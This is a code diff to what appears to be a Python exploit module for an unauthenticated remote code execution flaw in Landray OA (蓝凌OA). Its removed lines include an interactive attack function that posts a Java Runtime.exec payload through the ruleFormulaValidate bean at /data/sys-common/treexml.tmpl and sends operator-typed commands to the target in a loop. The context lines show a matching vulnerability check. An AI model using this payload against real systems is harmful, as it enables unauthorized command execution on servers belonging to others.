@@ -5,7 +5,6 @@ def verify(url):
     relsult = {
         'name': '蓝凌OA 未授权RCE(2022HVV)',
         'vulnerable': False,
-        'attack': True,
         'url': url
     }
     cmd = 'whoami'
@@ -32,32 +31,3 @@ System.err.println(e);
         return relsult
     except:
         return relsult
-
-def attack(url):
-    timeout = 5
-    headers = {
-        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) ",
-        'Content-Type': 'application/x-www-form-urlencoded',
-    }
-    payload = '/data/sys-common/treexml.tmpl'
-    vurl = urllib.parse.urljoin(url, payload)
-    try:
-        print('[+] 开始执行命令，输入exit退出')
-        while True:
-            cmd = input('[+] 执行命令(无回显) >')
-            if cmd == 'exit':
-                break
-            payload_data = '''s_bean=ruleFormulaValidate&script=try {
-            String cmd = "%s";
-            Process child = Runtime.getRuntime().exec(cmd);
-            } catch (IOException e) {
-            System.err.println(e);
-            }''' % cmd
-            try:
-                requests.post(vurl, headers=headers, timeout=timeout, verify=False, data=payload_data)
-            except:
-                pass
-            print('[*] 命令执行完成! 请结合dnslog平台验证是否成功?')
-        return True
-    except:
-        return False
